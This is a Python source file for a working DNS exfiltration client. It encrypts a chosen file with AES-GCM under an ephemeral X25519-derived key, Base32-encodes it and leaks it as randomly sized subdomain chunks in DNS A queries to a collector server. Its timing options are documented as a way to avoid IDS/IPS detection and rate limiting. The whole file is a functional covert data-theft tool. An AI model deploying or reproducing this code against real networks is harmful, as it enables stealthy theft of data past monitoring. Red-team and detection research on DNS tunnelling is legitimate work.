#!/usr/bin/env python3
"""
Module Name: client.py

Description:
    DNS exfiltration client with per-session ephemeral key exchange,
    AES-GCM encryption, and Base32 encoding.

    - Generates an ephemeral X25519 keypair per transfer.
    - Sends client pubkey via TXT query, receives server ephemeral pubkey
      in TXT response (true PFS — no persistent keys on either side).
    - Derives per-transfer AES key via ECDH + HKDF (context-bound).
    - Encrypts file with AES-GCM, Base32-encodes.
    - Splits into DNS-safe chunks and sends as A-query subdomains.

Author: John Burns
Date: 2025-05-02
Version: 4.0 (Structured wire format, no HMAC layer, shared crypto module)
"""

import argparse
import logging
import math
import random
import socket
import sys
import time
from uuid import uuid4

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from dnslib import DNSRecord, DNSQuestion, QTYPE

from crypto_utils import (
    load_signing_key, load_identity_pubkey, compute_fingerprint,
    derive_shared_keys, encrypt_file, base32_encode, base32_decode,
    encode_kex_payload, decode_kex_payload, configure_logging,
)

logger = logging.getLogger('client')

# Constants
MAX_RETRIES = 3


def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
    """
    Split Base32 string into DNS-safe subdomain labels of the form
      <identifier>-<idx>-<total>-<chunk>
    with each label <= max_label_len characters and chunk lengths randomized
    between min_size and the per-label maximum.
    """
    est_segments = max(1, math.ceil(len(b32_string) / min_size))
    tot_digits = len(str(est_segments))

    segments = []
    pos = 0
    idx = 0

    while pos < len(b32_string):
        idx_digits = len(str(idx))
        overhead = len(identifier) + idx_digits + tot_digits + 3
        available = max_label_len - overhead
        if available < min_size:
            raise ValueError(f"max_label_len={max_label_len} too small for min_size={min_size}")
        size = random.randint(min_size, available)
        segments.append(b32_string[pos:pos + size])
        pos += size
        idx += 1

    total = len(segments)
    for idx, seg in enumerate(segments):
        yield f"{identifier}-{idx}-{total}-{seg}"


def send_query(subdomain, args, sock):
    """
    Send a single DNS A query using the provided socket.
    Returns True on success.
    """
    fqdn = f"{subdomain}.{args.domain}"
    q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    sock.settimeout(2)
    try:
        sock.sendto(q.pack(), (args.server_ip, args.server_port))
        resp, _ = sock.recvfrom(4096)
        logger.debug(f"Response: {DNSRecord.parse(resp)}")
        return True
    except Exception as e:
        logger.warning(f"Query failed for {subdomain}: {e}")
        return False


def reliable_send(subdomain, args, sock):
    """
    Attempt to send DNS query with retries.
    """
    for attempt in range(1, MAX_RETRIES + 1):
        if send_query(subdomain, args, sock):
            logger.info(f"Sent {subdomain} successfully")
            return True
        logger.info(f"Retry {attempt} for {subdomain}")
    return False


def perform_key_exchange(identifier, args, sock, signing_key=None, server_identity_pubkey=None):
    """
    Generate ephemeral client keypair, send pubkey as TXT query,
    receive server's ephemeral pubkey from TXT response, derive shared key.

    Uses v4 structured wire format (version + length-prefixed fields).
    Returns aes_key (32 bytes).
    """
    client_priv = x25519.X25519PrivateKey.generate()
    pub_bytes = client_priv.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )

    # Build key exchange payload with structured wire format
    if signing_key:
        signature = signing_key.sign(pub_bytes)
        fingerprint = compute_fingerprint(signing_key.public_key())
        kex_payload = encode_kex_payload([pub_bytes, signature, fingerprint])
        logger.info(f"[{identifier}] Signing ephemeral key for authentication")
    else:
        kex_payload = encode_kex_payload([pub_bytes])

    b32_pub = base32_encode(kex_payload)

    # Split payload across DNS labels to stay within 63-char label limit.
    header = f"{identifier}-0-0-"
    max_first = 63 - len(header)
    labels = [header + b32_pub[:max_first]]
    rest = b32_pub[max_first:]
    while rest:
        labels.append(rest[:63])
        rest = rest[63:]
    subdomain = '.'.join(labels)
    fqdn = f"{subdomain}.{args.domain}"

    sock.settimeout(3)
    for attempt in range(1, MAX_RETRIES + 1):
        q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.TXT))
        try:
            sock.sendto(q.pack(), (args.server_ip, args.server_port))
            resp_data, _ = sock.recvfrom(4096)
            resp = DNSRecord.parse(resp_data)

            for rr in resp.rr:
                if rr.rtype == QTYPE.TXT:
                    txt = str(rr.rdata).strip('"')
                    response_bytes = base32_decode(txt)

                    # Parse structured response
                    version, fields = decode_kex_payload(response_bytes)

                    if len(fields) == 0:
                        # Rejection signal from server (e.g. --require-auth)
                        raise RuntimeError(f"[{identifier}] Server rejected key exchange (require-auth enabled?)")

                    server_pub_bytes = fields[0]

                    if len(fields) >= 2 and server_identity_pubkey:
                        # Authenticated response: verify server signature
                        server_sig = fields[1]
                        try:
                            server_identity_pubkey.verify(server_sig, server_pub_bytes)
                            logger.info(f"[{identifier}] Server identity VERIFIED — TRUSTED")
                        except Exception:
                            logger.warning(f"[{identifier}] Server signature verification FAILED — UNAUTHENTICATED")
                    elif len(fields) >= 2 and not server_identity_pubkey:
                        logger.warning(f"[{identifier}] Server sent signed response but no identity pubkey configured — UNAUTHENTICATED")
                    else:
                        if server_identity_pubkey:
                            logger.warning(f"[{identifier}] Server did not sign response — UNAUTHENTICATED")
                        else:
                            logger.info(f"[{identifier}] Key exchange completed — UNAUTHENTICATED")

                    logger.info(f"Received server ephemeral pubkey for session {identifier}")
                    aes_key = derive_shared_keys(
                        client_priv, server_pub_bytes, identifier,
                        pub_bytes, server_pub_bytes
                    )
                    return aes_key

            logger.warning(f"No TXT record in response, attempt {attempt}")
        except RuntimeError:
            raise
        except Exception as e:
            logger.warning(f"Key exchange query failed (attempt {attempt}): {e}")

    raise RuntimeError("Key exchange failed after all retries")


def main(args):
    identifier = uuid4().hex[:8]

    # Load optional authentication keys
    signing_key = load_signing_key(args.signing_key) if args.signing_key else None
    server_identity_pubkey = load_identity_pubkey(args.server_identity_pubkey) if args.server_identity_pubkey else None

    # Create a single UDP socket for the entire session
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Key exchange
        aes_key = perform_key_exchange(identifier, args, sock, signing_key, server_identity_pubkey)
        logger.info(f"Keys established for session {identifier}")

        # Drain any stale data from socket buffer before data transfer
        sock.setblocking(False)
        try:
            while True:
                sock.recvfrom(4096)
        except BlockingIOError:
            pass
        sock.setblocking(True)

        # Encrypt file (AES-GCM only, no HMAC layer)
        raw_blob = encrypt_file(args.file_path, aes_key)
        b32 = base32_encode(raw_blob)
        logger.debug(f"Base32 length: {len(b32)}")

        # Send data chunks
        failures = []
        for sub in chunk_payload(b32, identifier):
            time.sleep(random.uniform(args.low, args.high) / 1000.0)
            if not reliable_send(sub, args, sock):
                failures.append(sub)

        if failures:
            logger.error(f"Failed chunks: {failures}")
            sys.exit(1)
        logger.info("All chunks sent successfully")
    finally:
        sock.close()


def parse_args():
    p = argparse.ArgumentParser(description="DNS Exfiltration Client v4 (Ephemeral ECDH + AES-GCM)")
    p.add_argument('--server-ip', default='127.0.0.1')
    p.add_argument('--server-port', type=int, default=5300)
    p.add_argument('--file-path', required=True)
    p.add_argument('--domain', default='xf.example.com')
    p.add_argument('--low', type=int, default=500,
                   help='Reducing the minimum delay below 500ms may trigger IDS/IPS, rate limiting, or other actions to protect dns servers.')
    p.add_argument('--high', type=int, default=1000,
                   help='Should be adjusted to maintain a QPS of 1-2 queries per second.')
    p.add_argument('--signing-key', default=None,
                   help='Path to client Ed25519 private key for authentication')
    p.add_argument('--server-identity-pubkey', default=None,
                   help='Path to server Ed25519 public key for verifying server identity')
    p.add_argument('--json-log', action='store_true',
                   help='Output logs in JSON format')
    return p.parse_args()


if __name__ == '__main__':
    args = parse_args()
    configure_logging(json_log=args.json_log)
    main(args)
